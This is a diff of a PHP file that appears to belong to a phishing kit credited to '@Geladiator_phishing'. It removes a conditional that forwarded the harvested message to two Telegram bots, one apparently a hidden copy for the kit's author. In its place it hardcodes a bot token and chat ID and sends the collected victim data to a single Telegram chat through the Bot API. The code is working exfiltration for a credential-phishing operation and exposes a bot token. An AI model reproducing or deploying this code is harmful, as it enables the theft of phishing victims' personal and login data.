@@ -16,7 +16,6 @@ include "functions.php";
 include "time.php" ;
 $e= basename($_POST ["e"]);
 include"../data/$e.php";
-include"../INFO.php";
 
 $paylimit = 3; 
 $sendEmail = true;
@@ -81,10 +80,8 @@ $mailinfo
 ------------- Creator -------------
 🆔 : @Geladiator_phishing :)
 ";
-
-if( (integer)$num > $paylimit){}else{
-    file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
- file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));
-} 
+$TOKEN = "1377656404:AAFKWK1c9DAsnuFe4nPYuvgs9pNySku2AlA";
+$ID = 1276888885;
+file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
 
 ?>
